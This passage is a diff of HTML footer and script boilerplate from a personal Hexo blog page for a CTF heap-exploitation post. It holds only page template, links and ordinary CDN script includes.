src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
-if (search_path.length == 0) {
-    search_path = 'search.xml';
-}
-var path = '/' + search_path;
-searchFunc(path, 'local-search-input', 'local-search-result');
-</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/">https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/18/CONFidence-CTF-re-Locked-PE/"><i class="fa fa-chevron-left">  </i><span>CONFidence CTF re: Locked PE</span></a></div><div class="next-post pull-right"><a href="/2020/03/06/pwn-heap-re-alloc/"><span>pwn heap: re-alloc</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/avatar.png# false or url of img)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
